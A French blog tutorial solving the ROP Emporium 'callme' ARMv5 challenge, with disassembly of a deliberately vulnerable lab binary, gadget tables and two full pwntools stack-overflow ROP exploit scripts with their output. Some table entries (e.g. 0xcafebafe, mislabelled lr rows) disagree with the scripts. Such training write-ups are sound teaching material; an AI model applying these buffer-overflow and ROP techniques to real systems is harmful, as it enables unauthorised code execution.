---
Title: Ropemporium ARMv5 callme
Date: 2023-06-23
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---


# callme armv5

## Introduction.

Dans ce troisième exercice on doit appeller trois fonctions dans l'ordre attendu avec trois paramètres attendus.

Ennoncé sur le site ropemporium : [callme](https://ropemporium.com/challenge/callme.html)


## Découverte

### Contenu du challenge


    -rwxr-xr-x 1 jce jce  8612 juil.  5  2020 callme_armv5
    -rwxr-xr-x 1 jce jce  8636 juil. 19  2021 callme_armv5-hf
    -rw-r--r-- 1 jce jce 13126 juil. 19  2021 callme_armv5.zip
    -rw-r--r-- 1 jce jce    32 juil.  5  2020 encrypted_flag.dat
    -rw-r--r-- 1 jce jce  4593 juil.  4 22:48 gadgets.txt
    -rw-r--r-- 1 jce jce    16 juil.  3  2020 key1.dat
    -rw-r--r-- 1 jce jce    16 juil.  3  2020 key2.dat
    -rwxr-xr-x 1 jce jce  7808 juil. 19  2021 libcallme_armv5-hf.so
    -rwxr-xr-x 1 jce jce  7792 juil.  5  2020 libcallme_armv5.so


L'exercice comprend deux executables et deux librairies.


    jce@HPEliteBookJCE:~/w/ropemporium/armv5/03_callme$ readelf -h callme_armv5
    En-tête ELF:
      Magique:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
      Classe:                            ELF32
      Données:                          complément à 2, système à octets de poids faible d'abord (little endian)
      Version:                           1 (actuelle)
      OS/ABI:                            UNIX - System V
      Version ABI:                       0
      Type:                              EXEC (fichier exécutable)
      Machine:                           ARM
      Version:                           0x1
      Adresse du point d'entrée:               0x10684
      Début des en-têtes de programme :          52 (octets dans le fichier)
      Début des en-têtes de section :          7452 (octets dans le fichier)
      Fanions:                           0x5000200, Version5 EABI, soft-float ABI
      Taille de cet en-tête:             52 (octets)
      Taille de l'en-tête du programme:  32 (octets)
      Nombre d'en-tête du programme:     9
      Taille des en-têtes de section:    40 (octets)
      Nombre d'en-têtes de section:      29
      Table d'index des chaînes d'en-tête de section: 28

    jce@HPEliteBookJCE:~/w/ropemporium/armv5/03_callme$ readelf -h callme_armv5-hf
    En-tête ELF:
      Magique:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
      Classe:                            ELF32
      Données:                          complément à 2, système à octets de poids faible d'abord (little endian)
      Version:                           1 (actuelle)
      OS/ABI:                            UNIX - System V
      Version ABI:                       0
      Type:                              EXEC (fichier exécutable)
      Machine:                           ARM
      Version:                           0x1
      Adresse du point d'entrée:               0x10691
      Début des en-têtes de programme :          52 (octets dans le fichier)
      Début des en-têtes de section :          7476 (octets dans le fichier)
      Fanions:                           0x5000400, Version5 EABI, hard-float ABI
      Taille de cet en-tête:             52 (octets)
      Taille de l'en-tête du programme:  32 (octets)
      Nombre d'en-tête du programme:     9
      Taille des en-têtes de section:    40 (octets)
      Nombre d'en-têtes de section:      29

      Table d'index des chaînes d'en-tête de section: 28

Les deux programmes diffèrent sur  les lignes suivantes.

    11c11
    <   Adresse du point d'entrée:               0x10684
    ---
    >   Adresse du point d'entrée:               0x10691
    13,14c13,14
    <   Début des en-têtes de section :          7452 (octets dans le fichier)
    <   Fanions:                           0x5000200, Version5 EABI, soft-float ABI
    ---
    >   Début des en-têtes de section :          7476 (octets dans le fichier)
    >   Fanions:                           0x5000400, Version5 EABI, hard-float ABI

Les deux programmes diffèrent sur le flag correspondant à l'option de compilation -mfloat-abi qui spécifiée l'utilisation des instrutions FPU.

cf : [https://embeddedartistry.com/blog/2017/10/11/demystifying-arm-floating-point-compiler-options/]

En pratique on ne peut executer que le version soft avec qemu en l'absence de la librairie linux par exemple "/lib/ld-linux-armhf.so".
On va dont travailler seulement avec la version soft ici.
La version hard est utilisable sur un "rapsberry-pi" ou en ajoutant le paquet (sous debian)

``` bash
apt install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf
```

### Execution du programme avec qemu

        armv5/03_callme$ qemu-arm callme_armv5
        callme by ROP Emporium
        ARMv5

        Hope you read the instructions...

        > AAAAAAAAAAAABBBBBBBBBBBBCCCCCCCCCCCCDDDDDDDDDDDDEEEE
        Thank you!
        qemu: uncaught target signal 11 (Segmentation fault) - core dumped

        Erreur de segmentation (core dumped)



## Analyse

Le code de la fonction pwnme :


    [0x00010684]> pdf @ sym.pwnme
            ; CALL XREF from main @ 0x107a4(x)
    ┌ 88: sym.pwnme ();
    │           ; var void *buf @ fp-0x24
    │           ; var int32_t var_4h_2 @ sp+0x20
    │           ; var int32_t var_4h @ sp+0x24
    │           0x000107cc      00482de9       push {fp, lr}
    │           0x000107d0      04b08de2       add fp, var_4h
    │           0x000107d4      20d04de2       sub sp, sp, 0x20
    │           0x000107d8      24304be2       sub r3, buf
    │           0x000107dc      2020a0e3       mov r2, 0x20
    │           0x000107e0      0010a0e3       mov r1, 0                   ; int c
    │           0x000107e4      0300a0e1       mov r0, r3                  ; void *s
    │           0x000107e8      9cffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
    │           0x000107ec      30009fe5       ldr r0, str.Hope_you_read_the_instructions..._n ; [0x10910:4]=0x65706f48 ; 
    │           0x000107f0      8bffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x000107f4      2c009fe5       ldr r0, str.__              ; [0x10934:4]=0x203e ; "> " ; const char *format
    │           0x000107f8      7dffffeb       bl sym.imp.printf           ; int printf(const char *format)
    │           0x000107fc      24304be2       sub r3, buf
    │           0x00010800      022ca0e3       mov r2, 0x200
    │           0x00010804      0310a0e1       mov r1, r3                  ; void *buf
    │           0x00010808      0000a0e3       mov r0, 0                   ; int fildes
    │           0x0001080c      7bffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
    │           0x00010810      14009fe5       ldr r0, str.Thank_you_      ; [0x10938:4]=0x6e616854 ; "Thank you!" ; const char *s
    │           0x00010814      82ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00010818      0000a0e1       mov r0, r0                  ; 0x10938 ; "Thank you!"
    │           0x0001081c      04d04be2       sub sp, var_4h_2
    └           0x00010820      0088bde8       pop {fp, pc}

Le buffer de lecture du read est en fp-0x24
On enverra donc un message de debordement de 0x28 (40) octets


La fonction suivante nous indique l'existence et le pararmétrage des fonction callme_xxx.

    ┌ 64: sym.usefulFunction ();
    │           ; var int32_t var_4h @ sp+0x4
    │           0x00010830      00482de9       push {fp, lr}
    │           0x00010834      04b08de2       add fp, var_4h
    │           0x00010838      0620a0e3       mov r2, 6
    │           0x0001083c      0510a0e3       mov r1, 5
    │           0x00010840      0400a0e3       mov r0, 4
    │           0x00010844      70ffffeb       bl sym.imp.callme_three
    │           0x00010848      0620a0e3       mov r2, 6
    │           0x0001084c      0510a0e3       mov r1, 5
    │           0x00010850      0400a0e3       mov r0, 4
    │           0x00010854      84ffffeb       bl sym.imp.callme_two
    │           0x00010858      0620a0e3       mov r2, 6
    │           0x0001085c      0510a0e3       mov r1, 5
    │           0x00010860      0400a0e3       mov r0, 4
    │           0x00010864      6bffffeb       bl sym.imp.callme_one
    │           0x00010868      0100a0e3       mov r0, 1                   ; int status
    └           0x0001086c      75ffffeb       bl sym.imp.exit             ; void exit(int status)

On doit appeller ces fonctions avec les paramètres 0xdeadbeef, 0xcafebabe, 0xd00df00d.

### La ropchaine

Identification des gadgets :

Un gadget nous permet de charger les registres r0 à r2.
Il nous est gracieusement fournit :

    0x00010684]> pd 2 @loc.usefulGadgets
    │           ;-- usefulGadgets:
    └           0x00010870      07c0bde8       pop {r0, r1, r2, lr, pc}
    ...

On aurra besoin aussi d'un gadget qui nous permete d'ajuster la pile.

      0x000108dc           0880bde8  pop {r3, pc}


Usage du gadget `pop {r0, r1, r2, lr, pc}`.

On va poser sur la pile la valeur de nos paramètre puis au final l'adresse de callme_one.
pc sera chargé avec l'adresse de la fonction ce qui correspond à un saut à cette fonction.
Quid de la valeur à charger dans lr ?

lr doit contenir l'adresse de retour qui sera utilisée à la sortie de `callme_one`.
Il nous faut donc alors executer du code qui nous permettre de continuer le déroulement de notre chaine.

On peut y placer l'adresse de notre gadget `pop {r0, r1, r2, lr, pc}` en tant que prochaine entrée de la chaine.


| ROP entry | comment |
| ----------- | ------- |
| 0x00010870 | pop {r0, r1, r2, lr, pc}
| 0xdeadbeef | r0
| 0xcafebafe | r1
| 0xd00df00d | r2
| 0x000108dc | lr : pop {r0, r1, r2, lr, pc}
| callme_one | callme_one |

ensuite on peut enchaîner

| ROP entry | comment |
| ----------- | ------- |
| 0xdeadbeef | r0
| 0xcafebabe | r1
| 0xd00df00d | r2
| 0x000108dc | lr : pop {r0, r1, r2, lr, pc}
| callme_one | callme_two |
| 0xdeadbeef | r0
| 0xcafebafe | r1
| 0xd00df00d | r2
| 0x000108dc | lr : 0 (sans importance)
| callme_one | callme_three |

### Optimisation pour l'automatisation.

Le "soucis" de la solution précédente est qu'elle est linéaire.
Sin on avait 100 appel de fonctions à réalsier on aimerait bien pourvoir générer les appels avec une boucle.

Pour que chaque séquence soit dientique et commence par le `pop {r0, r1, r2, lr, pc}` on peut placer dans le registe lr un gadget d'ajustement, idéalement une `pop {pc}`qui enchainerait sur la séquence. Mais ce gadget n'existe pas. On peut utliser un `pop {reg, pc}` qui existe et qui fara la même chose mais en consommant une entrée de la chaine pour charge le registre.

Ici on utilise un `pop {r3, pc}`.

On peut ainsi boucler sur nos trois adresses pour callme_xxx

| ROP entry | comment |
| ----------- | ------- |
| 0x00010870 | pop {r0, r1, r2, lr, pc}
| 0xdeadbeef | r0
| 0xcafebabe | r1
| 0xd00df00d | r2
| 0x000108dc | lr : pop {r3, pc}
| callme_xxx | callme_xxx |
| 0x90 | pour le pop r3 au retour de callme_one




## Exploitation

### Script python premier style

Le script python de la solution linéaire.

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_armv5')

# 64 : read
# 84 : ret
gs='''
b *pwnme+84
c
'''

# 0x00010870 : pop {r0, r1, r2, lr, pc}
g_pop_r012 = 0x00010870

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x20

PL=b"A"*offset
PL+=p32(1)              # Pour fp

PL+=p32(g_pop_r012)
PL+=p32(0xdeadbeef)     # r0
PL+=p32(0xcafebabe)     # r1
PL+=p32(0xd00df00d)     # r2
PL+=p32(g_pop_r012)     # lr adresse de retour de callme
PL+=p32(callme_one)

PL+=p32(0xdeadbeef)     # r0
PL+=p32(0xcafebabe)     # r1
PL+=p32(0xd00df00d)     # r2
PL+=p32(g_pop_r012)     # lr adresse de retour de callme
PL+=p32(callme_two)

PL+=p32(0xdeadbeef)     # r0
PL+=p32(0xcafebabe)     # r1
PL+=p32(0xd00df00d)     # r2
PL+=p32(0)              # lr adresse de retour de callme
PL+=p32(callme_three)

io.sendline(PL)
io.interactive()
```


### Execution

    [*] '/home/jce/w/ropemporium/armv5/03_callme/callme_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/armv5/03_callme/callme_armv5': pid 7553
    [*] callme_one=10618
    [*] callme_two=1066c
    [*] callme_three=1060c
    [*] Switching to interactive mode
    Thank you!
    callme_one() called correctly
    callme_two() called correctly
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive

### Script python second style style

Le script python de la solution avec boucle.

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_armv5')

# 64 : read
# 84 : ret
gs='''
b *pwnme+84
c
'''

# pop {r3, pc}
g_popr3 = 0x000108dc
# 0x00010870 : pop {r0, r1, r2, lr, pc}
g_pop_r012 = 0x00010870

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

print(elf.symbols)
callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x20

PL=b"A"*offset
PL+=p32(1)              # Pour fp

for adrcall in [callme_one, callme_two, callme_three ]:
    PL+=p32(g_pop_r012)
    PL+=p32(0xdeadbeef)     # r0
    PL+=p32(0xcafebabe)     # r1
    PL+=p32(0xd00df00d)     # r2
    PL+=p32(g_popr3)        # lr adresse de retour de callme
    PL+=p32(adrcall)
    PL+=p32(3)              # pour le r3 de pop {r3,pc}

print(PL.hex())
io.sendline(PL)
io.interactive()
```

### Execution

    [*] '/home/jce/w/ropemporium/armv5/03_callme/callme_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/home/jce/w/ropemporium/armv5/03_callme/callme_armv5': pid 7681
    [*] callme_one=10618
    [*] callme_two=1066c
    [*] callme_three=1060c
    [*] Switching to interactive mode
    Thank you!
    callme_one() called correctly
    callme_two() called correctly
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive


